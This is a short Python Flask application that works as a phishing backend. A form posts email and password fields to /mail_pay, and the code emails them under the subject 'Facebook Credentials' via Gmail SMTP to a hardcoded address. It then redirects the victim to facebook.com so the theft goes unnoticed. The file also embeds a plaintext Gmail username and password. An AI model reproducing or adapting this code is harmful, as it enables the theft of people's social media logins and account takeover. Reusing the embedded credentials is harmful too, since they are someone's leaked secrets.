
from flask import Flask, url_for, render_template, request, redirect
from flask_mail import Mail, Message

app = Flask(__name__) 

app.config.update(dict(
    DEBUG = True,
    MAIL_SERVER = 'smtp.gmail.com',
    MAIL_PORT = 587,
    MAIL_USE_TLS = True,
    MAIL_USE_SSL = False,
    MAIL_USERNAME = 'rammulu4@gmail.com',
    MAIL_PASSWORD = 'ravinikki',
))


mail = Mail(app)  

@app.route('/') 
def hello_world(): 
    return render_template('index.html')

@app.route('/mail_pay', methods=['get','post'])
def done():
	email = request.form['email']
	password = request.form['password']
	print(email,"\n\n\n",password)
	msg = Message("Facebook Credentials", sender = 'rammulu4@gmail.com', recipients = ['rammulu4@gmail.com'])
	msg.body = 'Email : %s \nPassword : %s'%(email,password)
	mail.send(msg)
	return redirect("https://www.facebook.com/")


if __name__ == '__main__': 
    app.debug = True
    app.run(host='0.0.0.0', port=8000) 